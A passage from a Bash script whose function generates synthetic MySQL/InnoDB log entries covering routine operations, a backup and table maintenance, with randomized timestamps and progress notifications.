        "Backing up table data for database 'logs'"
        "Backup completed successfully"
        "Backup size: 156.7 MB"
        "Backup stored at /var/backups/mysql/backup-DATE.sql.gz"
    )
    
    # Database maintenance messages
    local maintenance_messages=(
        "Starting scheduled database maintenance"
        "InnoDB: Starting optimization process"
        "InnoDB: Creating foreign key constraint on 'orders.user_id'"
        "InnoDB: Foreign key constraint created on 'orders.user_id'"
        "Checking table 'users'"
        "Table 'users' is already up to date"
        "Checking table 'products'"
        "Table 'products' is already up to date"
        "Checking table 'orders'"
        "Table 'orders' OK"
        "Checking table 'logs'"
        "Table 'logs' is already up to date"
        "Found 2560 deleted records in table 'logs'"
        "Purging old records from 'logs' table"
        "Deleted 2560 old records from 'logs' table"
        "Optimizing table 'logs'"
        "Table 'logs' optimized"
        "Starting table analysis"
        "Analyzing table 'users'"
        "Table 'users' analyzed, updating statistics"
        "Analyzing table 'products'"
        "Table 'products' analyzed, updating statistics"
        "Analyzing table 'orders'"
        "Table 'orders' analyzed, updating statistics"
        "Repairing table 'orders' - found minor inconsistency"
        "Table 'orders' repaired"
        "InnoDB: Starting buffer pool dump"
        "InnoDB: Buffer pool dump completed"
        "InnoDB: Completed optimization"
        "Maintenance completed successfully"
    )
    
    # Normal operation messages
    local normal_messages=(
        "Got an error reading communication packets"
        "Access denied for user 'app'@'localhost' (using password: YES)"
        "Normal shutdown"
        "Server system variables were changed while thread was running query"
        "Aborted connection to db: 'unconnected' user: 'unauthenticated' host: 'localhost' (Got timeout reading communication packets)"
        "Aborted connection to db: 'users' user: 'app' host: 'localhost' (Got an error reading communication packets)"
        "InnoDB: page_cleaner: 1000ms intended loop took 10234ms. The settings might not be optimal."
        "Thread ID 1234 ended"
        "Thread ID 5678 started"
        "InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M"
        "InnoDB: Buffer pool(s) load completed at 210627 10:31:15"
        "InnoDB: Starting crash recovery from checkpoint LSN=294059493"
        "InnoDB: Starting final batch to recover 6 pages"
        "InnoDB: 128 rollback segments are active"
        "InnoDB: Waiting for purge to start"
        "InnoDB: Purge finished for trx's n:o < 10592 undo n:o < 0 state: running"
        "InnoDB: page_cleaner: 1000ms intended loop took 10234ms. The settings might not be optimal."
        "Ready for connections. Version: '8.0.26'"
    )
    
    # Track progress
    local current_entry=0
    local total_entries=$num_entries
    
    show_notification "Generating database maintenance sequence..." "info"
    
    # Normal operations before backup
    local normal_ops_count_before=$((num_entries / 4))
    for ((i=0; i<normal_ops_count_before; i++)); do
        local ts=$(generate_random_timestamp $start_time $backup_start_time)
        local date_str=$(date -d @$ts "+%Y-%m-%d %H:%M:%S")
        
        # Random normal message
        local message=${normal_messages[$RANDOM % ${#normal_messages[@]}]}
        
        # Random log level
        local levels=("Note" "Warning" "Error" "System")
        local level=${levels[$RANDOM % ${#levels[@]}]}
        
        # Create log entry
        local entry="$date_str [$level] $message"
        
        # Write to database log
        echo "$entry" >> "$db_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating database logs"
        fi
    done
    
    # Backup operations
    for ((i=0; i<${#backup_messages[@]}; i++)); do
        local ts=$((backup_start_time + i * 10)) # 10 second intervals
        local date_str=$(date -d @$ts "+%Y-%m-%d %H:%M:%S")
        
        # Get the message and replace any placeholders
        local message=${backup_messages[$i]}
        message=${message//DATE/$(date -d @$ts "+%Y%m%d%H%M%S")}
        
        # Create log entry
        local entry="$date_str [Note] $message"
        
        # Write to database log
        echo "$entry" >> "$db_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating database logs"
        fi
    done
    
    # Maintenance operations
    for ((i=0; i<${#maintenance_messages[@]}; i++)); do
        local ts=$((maintenance_start_time + i * 20)) # 20 second intervals
        local date_str=$(date -d @$ts "+%Y-%m-%d %H:%M:%S")
        
        # Create log entry
        local entry="$date_str [System] ${maintenance_messages[$i]}"
        
        # Write to database log
        echo "$entry" >> "$db_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating database logs"
        fi
    done
    
    # Normal operations after maintenance
    local remaining_entries=$((total_entries - current_entry))
    for ((i=0; i<remaining_entries; i++)); do
        local ts=$(generate_random_timestamp $maintenance_end_time $end_time)
        local date_str=$(date -d @$ts "+%Y-%m-%d %H:%M:%S")
        
        # Random normal message
        local message=${normal_messages[$RANDOM % ${#normal_messages[@]}]}
        
        # Random log level
        local levels=("Note" "Warning" "Error" "System")
        local level=${levels[$RANDOM % ${#levels[@]}]}
        
        # Create log entry
        local entry="$date_str [$level] $message"
        
        # Write to database log
        echo "$entry" >> "$db_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating database logs"
        fi
    done
    
    show_notification "Database maintenance logs generation complete!" "success"
    log_action "Generated database maintenance logs: backup at $(date -d @$backup_start_time), maintenance at $(date -d @$maintenance_start_time)"
    
    return 0
}